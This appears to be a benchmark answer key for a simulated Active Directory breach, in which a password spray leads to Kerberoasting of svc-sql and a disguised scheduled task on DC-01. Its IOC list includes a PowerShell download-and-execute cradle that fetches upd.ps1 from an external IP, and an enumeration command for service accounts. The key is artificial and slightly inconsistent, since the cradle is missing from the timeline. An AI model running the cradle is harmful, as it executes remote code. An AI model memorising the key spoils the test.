# Ground Truth: credential-spray-domain-compromise

**Scenario:** A small engineering firm's domain gets compromised in three linked
stages: an external credential-spray attack against several employee
accounts succeeds against one (diane.foster); from her workstation the
attacker enumerates Kerberoastable service accounts and requests a
ticket for an over-privileged SQL service account (svc-sql, a
pre-existing misconfiguration — it's a member of Domain Admins); after
a realistic offline-cracking delay, the attacker uses the cracked
credential to log onto the domain controller directly as svc-sql and
plants a scheduled task for persistence. Tests whether an agent
correctly separates "how they got in" (diane.foster) from "what they
did once in" (svc-sql) rather than crediting the sprayed account with
the lasting compromise.


**Generated:** 2024-09-09 13:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **SYSTEM** on **DC-01**: External credential-spray attack tries a low-and-slow password against several employee accounts; all fail
2. **diane.foster** on **WS-DFOSTER-01**: The spray eventually guesses diane.foster's actual password; a distinct successful logon follows from the same external range
3. **diane.foster** on **WS-DFOSTER-01**: Attacker uses the compromised session to enumerate domain accounts with Kerberoastable service principal names
4. **diane.foster** on **WS-DFOSTER-01**: Attacker requests a Kerberos service ticket for svc-sql using explicit alternate credentials, consistent with Kerberoasting tooling, then goes quiet — the ticket is cracked offline over the following hours
5. **svc-sql** on **DC-01**: Roughly 19 hours after the ticket request — consistent with offline cracking, not a normal same-session escalation — the attacker uses the cracked svc-sql credential to log onto the domain controller directly, from diane.foster's own workstation rather than externally
6. **svc-sql** on **DC-01**: Attacker plants a scheduled task on the domain controller for persistent access, disguised as a routine maintenance task


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-09-09 15:05:12 UTC | SYSTEM | DC-01 | Credential_Spray | Credential spray: 3 attempts against 3 accounts |
| 2024-09-09 15:15:52 UTC | diane.foster | WS-DFOSTER-01 | Logon | Network logon from 185.220.101.44 (LogonID: 0xe8a8fcd) |
| 2024-09-09 15:21:48 UTC | diane.foster | WS-DFOSTER-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 4412) - `powershell.exe -NoProfile -Command Get-ADUser -...` |
| 2024-09-09 15:26:35 UTC | diane.foster | WS-DFOSTER-01 | Explicit_Credentials | Explicit credentials: RunAs svc-sql on DC-01 |
| 2024-09-10 10:40:08 UTC | svc-sql | DC-01 | Rdp_Session | RDP session to 10.55.20.10:3389 (UID: (filtered by sensor placement)) |
| 2024-09-10 10:48:19 UTC | svc-sql | DC-01 | Scheduled_Task_Created | Scheduled task created: WindowsDefenderUpdateCheck |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.55.20.10:3389 (Lateral Movement)
- 185.220.101.44 (Attacker IP)

### Process IOCs

- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Scheduled Task: WindowsDefenderUpdateCheck
- `powershell.exe -NoProfile -Command Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,MemberOf`

### User IOCs

- SYSTEM (compromised account)
- diane.foster (compromised account)
- diane.foster (Spray Target) (compromised account)
- elena.popov (Spray Target) (compromised account)
- mark.chen (Spray Target) (compromised account)
- svc-sql (compromised account)
- svc-sql (Explicit Credential Target) (compromised account)

### File IOCs

- powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://45.83.221.30/upd.ps1')
